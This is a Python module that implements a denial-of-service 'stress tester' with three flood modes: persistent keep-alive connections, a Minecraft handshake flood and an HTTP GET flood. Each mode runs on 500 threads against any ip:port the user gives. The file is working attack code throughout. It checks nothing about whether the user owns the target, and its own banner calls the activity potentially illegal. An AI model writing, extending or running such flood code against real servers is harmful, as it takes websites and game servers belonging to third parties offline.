import socket
import ssl
import threading
import time
import random
from core.colors import COLOR

class StressTester:
    def __init__(self):
        self.running = False
        self.max_workers = 500  # Increased worker pool
        self.default_duration = 60
        self.timeout = 30  # Longer timeout for persistent connections
        self.user_agents = [
            "Mozilla/5.0", "curl/7.68.0", "Java/1.8.0",
            "MCBot/1.0", "Python-urllib/3.8"
        ]

    def create_persistent_connection(self, ip, port):
        """Create and maintain a persistent connection"""
        while self.running:
            try:
                s = socket.create_connection((ip, port), timeout=self.timeout)
                # For HTTPS targets
                if port == 443:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=ip)
                
                # Send periodic keep-alive traffic
                while self.running:
                    s.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % ip.encode())
                    time.sleep(random.uniform(5, 15))
            except Exception as e:
                time.sleep(1)
            finally:
                try: s.close()
                except: pass

    def advanced_minecraft_flood(self, ip, port):
        """More sophisticated Minecraft protocol flood"""
        while self.running:
            try:
                s = socket.create_connection((ip, port), timeout=self.timeout)
                # Send handshake + login start packet
                s.sendall(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00')
                # Send periodic keep-alives
                while self.running:
                    s.sendall(b'\x01\x00')  # Keep alive packet
                    time.sleep(5)
            except:
                time.sleep(1)
            finally:
                try: s.close()
                except: pass

    def http_flood(self, ip, port):
        """HTTP GET flood with varied headers"""
        headers = [
            "User-Agent: {}\r\n".format(random.choice(self.user_agents)),
            "Accept: */*\r\n",
            "Accept-Language: en-US\r\n",
            "Connection: keep-alive\r\n"
        ]
        while self.running:
            try:
                s = socket.create_connection((ip, port), timeout=self.timeout)
                request = "GET / HTTP/1.1\r\nHost: {}\r\n".format(ip) + "".join(headers) + "\r\n"
                s.sendall(request.encode())
                # Read response to make it more realistic
                s.recv(1024)
                time.sleep(random.uniform(0.1, 0.5))
            except:
                time.sleep(0.5)
            finally:
                try: s.close()
                except: pass

def handle_stress(args):
    tester = StressTester()
    
    try:
        ip, port = args[0].split(':')
        port = int(port)
    except:
        print(f"{COLOR.RED}Invalid format. Use <ip:port>{COLOR.RESET}")
        return

    # Enhanced parameters
    mode = "persistent" if "--persistent" in args else (
           "minecraft" if "--minecraft" in args else "http")
    
    duration = min(
        int(args[args.index("--duration")+1]) if "--duration" in args else tester.default_duration,
        600  # Max 10 minutes
    )

    # Stronger warning
    print(f"\n{COLOR.NEON_RED}⚠️ WARNING: POTENTIALLY ILLEGAL ACTIVITY ⚠️{COLOR.RESET}")
    print(f"Target: {COLOR.WHITE}{ip}:{port}{COLOR.RESET}")
    print(f"Mode: {mode.upper()} | Duration: {duration}s | Workers: {tester.max_workers}")
    
    confirm = input(f"{COLOR.YELLOW}Type 'CONFIRM' to proceed: {COLOR.RESET}")
    if confirm != "CONFIRM":
        return

    # Run test
    tester.running = True
    threads = []

    print(f"\n{COLOR.BLUE}Starting enhanced stress test...{COLOR.RESET}")
    
    target_func = {
        "persistent": tester.create_persistent_connection,
        "minecraft": tester.advanced_minecraft_flood,
        "http": tester.http_flood
    }[mode]

    for _ in range(tester.max_workers):
        t = threading.Thread(target=target_func, args=(ip, port))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        tester.running = False
        print(f"{COLOR.YELLOW}\nTest stopped by user{COLOR.RESET}")
    
    tester.running = False
    print(f"{COLOR.GREEN}Test completed.{COLOR.RESET}")